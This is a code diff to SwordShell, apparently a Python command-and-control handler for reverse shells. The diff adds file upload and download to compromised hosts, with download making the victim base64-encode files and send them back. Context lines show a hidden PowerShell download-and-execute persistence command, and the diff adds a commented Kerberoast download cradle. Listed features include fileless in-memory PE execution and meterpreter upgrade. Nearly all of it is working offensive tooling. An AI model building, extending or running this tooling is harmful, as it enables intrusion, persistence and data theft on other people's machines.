@@ -208,6 +208,8 @@ Commands:
   upgrade <id> - Upgrade a shell to a meterpreter shell (require metasploit)
   exec <id> <url> <TYPE> - Execute a PE file in memory filelessly  (EXE, DLL) , no GUI !
   persist <id> - Persist a shell using keres(persistance module) 
+  upload <id> <file_path> - Upload a file to the target machine
+  download <id> <file_path> - Download a file from the target machine
   exit | Ctrl +c*2    - Exit SwordShell
 """
 # Clear the terminal screen
@@ -222,10 +224,12 @@ parser = argparse.ArgumentParser(description="Run the Swordshell program.")
 parser.add_argument('-host', type=str, default='0.0.0.0', help='host ip.')
 parser.add_argument('-port', type=int, default=5555, help='The port to listen on.')
 parser.add_argument('-http-server-port', type=int, default=8585, help='The port to connect to.')
+parser.add_argument('-https-server-port', type=int, default=8443, help='The port to connect to.')
 # Parse the arguments
 args = parser.parse_args()
 
 # Use the arguments
+https_server_port = args.https_server_port
 host = args.host
 port = args.port
 http_server_port = args.http_server_port
@@ -292,7 +296,7 @@ def persist_shell(conn, addr, shell_id):
     url = f"https://{get_my_ip()}:8443/persist.ps1"
     # Convert the script to a base64 string
     command = f'powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "iex ((iwr -Uri {url}).Content)"'
-
+    #iex​(New-Object Net.WebClient).DownloadString('https://YOUR_IP/Kerberoast.ps1') 
     # Create the PowerShell command
     print("\033[91m[*] Executing Keres in memory ..... \033[0m")
     # Execute the command on shell 
@@ -348,9 +352,12 @@ def get_my_ip(host=None):
     return IP
 
 def handle_client(conn, addr):
+    shell_type, os_type = get_shell_type(conn)
+    
     print(Fore.GREEN, f'\n[*] Connecting to session: {addr[0]}:{addr[1]}', Fore.WHITE)
+    print(f"Connected to a {shell_type} shell on a {os_type} system.")
     print(f'\n[*] press Ctrl+c to go back ', Fore.WHITE)
-
+    conn.send("\n".encode())
     while True:
         read_sockets, _, _ = select.select([conn, sys.stdin], [], [], 1)
 
@@ -359,13 +366,13 @@ def handle_client(conn, addr):
                 if sock == conn:
                     data = conn.recv(1024)
                     if not data:
-                        print("\033[91mconnection to " + addr[0] + " lost\033[0m")
+                        print("\033[91m connection to " + addr[0] + " lost\033[0m")
                         remove_connection(conn)
                         break
                     print(data.decode(), end="")
                 else:
                     mycmd = input()
-                    mycmd = mycmd + "\n"
+                    #mycmd = mycmd + "\n"
                     conn.send(mycmd.encode())
             except ConnectionError:
                 print("\033[91mconnection to " + addr[0] + " lost\033[0m")
@@ -376,7 +383,7 @@ print(Fore.YELLOW + "[+] Your local IP : "+get_my_ip(), Fore.WHITE)
 print(Fore.YELLOW + "[+] Your public IP : "+requests.get('https://api.ipify.org').text, Fore.WHITE)
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind((host, port))
+s.bind(("0.0.0.0", port))
 s.listen(5)
 print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)
 
@@ -386,7 +393,29 @@ def remove_connection(conn):
     global connections
     connections = [(c, addr) for c, addr in connections if c != conn]
 
+def get_shell_type(conn):
+    try:
+    # Send a command to check if it's a PowerShell or CMD shell
+        conn.sendall('echo $PSVersionTable.PSVersion'.encode())
+        response = conn.recv(1024).decode().strip().lower()
+        if 'major' in response:
+            return 'powershell', 'windows'
 
+        # If it's not PowerShell, check if it's a CMD shell
+        conn.sendall('ver'.encode())
+        response = conn.recv(1024).decode().strip().lower()
+        if 'windows' in response:
+            return 'cmd', 'windows'
+
+        # If it's not PowerShell or CMD, check if it's a Bash shell
+        conn.sendall('echo $BASH_VERSION'.encode())
+        response = conn.recv(1024).decode().strip().lower()
+        if 'bash' in response:
+            return 'bash', 'unix'
+    except BrokenPipeError:
+        print("Connection lost or shell closed. Please check the connection.")
+    # If none of the above checks succeed, return unknown
+    return 'unknown', 'unknown'
 
 
 def accept_connections():
@@ -395,7 +424,11 @@ def accept_connections():
         ip_connections = [connection for connection in connections if connection[1][0] == addr[0]]
         if len(ip_connections) < 3:
             connections.append((conn, addr))
-            print(Fore.GREEN + '\n\033[94m[*] Accepted new connection from: \033 ' + Fore.YELLOW + f'{addr[0]}' + Fore.GREEN + f':{addr[1]}' + Fore.WHITE)
+            shell_type, os_type = get_shell_type(conn)
+            
+            print(f"{Fore.GREEN}\n\033[94m[*] Accepted new connection from: \033{Fore.YELLOW}{addr[0]}{Fore.GREEN}:{addr[1]}{Fore.WHITE} PL: "
+      f"{Fore.CYAN if os_type == 'windows' else Fore.YELLOW}{os_type}"
+      f"{Fore.BLUE if shell_type == 'powershell' else Fore.LIGHTBLACK_EX if shell_type == 'cmd' else Fore.LIGHTYELLOW_EX} {shell_type} shell{Fore.WHITE}")
         else:
             #print(Fore.RED + '\n[*] Connection limit reached for: ' + Fore.YELLOW + f'{addr[0]}' + Fore.RED + Fore.WHITE)
             conn.close()
@@ -403,6 +436,56 @@ def accept_connections():
 accept_thread = threading.Thread(target=accept_connections)
 # Start the new thread
 accept_thread.start()
+
+def upload_file(conn, file_path):
+    try:
+        
+
+        # Send a command to the reverse shell to write the file
+
+        conn.sendall(f"""curl  https://{get_my_ip()}:8443/{file_path} -OJ""")
+
+        print(f"File {file_path} uploaded successfully.")
+    except FileNotFoundError:
+        print(f"File {file_path} not found.")
+    except Exception as e:
+        print(f"An error occurred while uploading the file: {e}")
+
+def download_file(conn, file_path):
+    try:
+        conn.sendall('uname'.encode())
+        os_type = conn.recv(1024).decode().strip().lower()
+        if 'command not found' in os_type or 'not recognized' in os_type:
+            os_type = 'windows'
+        else:
+            os_type = 'unix'
+
+        # Send a command to the reverse shell to read the file
+        if os_type == 'windows':
+            conn.sendall(f'powershell -command "[convert]::ToBase64String([IO.File]::ReadAllBytes(\'{file_path}\'))"'.encode())
+        else:  # Assume Unix-like system
+            conn.sendall(f'base64 {file_path}'.encode())
+
+        # Receive the file data from the reverse shell
+        with open(file_path, 'wb') as file:
+            data_received = []
+            while True:
+                conn.settimeout(5.0)  # Set a timeout of 5 seconds
+                try:
+                    data = conn.recv(1024)
+                    if not data:
+                        break
+                    data_received.append(data)
+                except socket.timeout:
+                    print("No data received for 5 seconds, stopping download.")
+                    break
+
+            # Ignore the last line of the output (the prompt)
+            file.write(b'\n'.join(data_received[:-1]))
+
+        print(f"File {file_path} downloaded successfully.")
+    except Exception as e:
+        print(f"An error occurred while downloading the file: {e}")
 
 # This function will be called when the alarm signal is raised
 def handler(signum, frame):
@@ -430,6 +513,26 @@ while True:
             if not session_started:
                 command = input(Fore.YELLOW + "\n-{-->> " + Fore.GREEN)
                 readline.add_history(command)
+                if command.startswith('upload '):
+                    parts = command.split()
+                    if len(parts) < 3:
+                        print("Invalid command. Usage: upload <id> <file_path>")
+                        continue
+                    shell_id = parts[1]
+                    file_path = parts[2]
+                    session = int(shell_id) - 1
+                    conn, addr = connections[session]
+                    upload_file(conn, file_path)
+                if command.startswith('download '):
+                    parts = command.split()
+                    if len(parts) < 3:
+                        print("Invalid command. Usage: download <id> <file_path>")
+                        continue
+                    shell_id = parts[1]
+                    file_path = parts[2]
+                    session = int(shell_id) - 1
+                    conn, addr = connections[session]
+                    download_file(conn, file_path)
                 if command.startswith('persist '):
                     shell_id = command.split()[1]
                     session = int(command.split(' ')[1]) - 1
@@ -462,8 +565,14 @@ while True:
                     exec_shell(conn, addr, shell_id, url,type)     
                 if command == 'list':
                     print("\nAvailable rev-shell sessions:")
+                    print("ID | IP:Port             | Platform | Shell Type")
+                    print("--------------------------------------------------")
                     for i, connection in enumerate(connections):
-                        print(f"\033[91m{i+1}. {connection[1][0]}:{connection[1][1]}\033[0m")
+                        shell_type, os_type = get_shell_type(connection[0])  # Assuming connection[0] is the conn object
+                        os_color = Fore.CYAN if os_type == 'windows' else Fore.YELLOW
+                        shell_color = Fore.BLUE if shell_type == 'powershell' else Fore.LIGHTBLACK_EX if shell_type == 'cmd' else Fore.LIGHTYELLOW_EX
+                        
+                        print(f"\033[91m{i+1}\033[0m | {connection[1][0]}:{connection[1][1]} | {os_color}{os_type}\033[0m | {shell_color}{shell_type}\033[0m")
                     break
                 elif command.startswith('session '):
                     try:
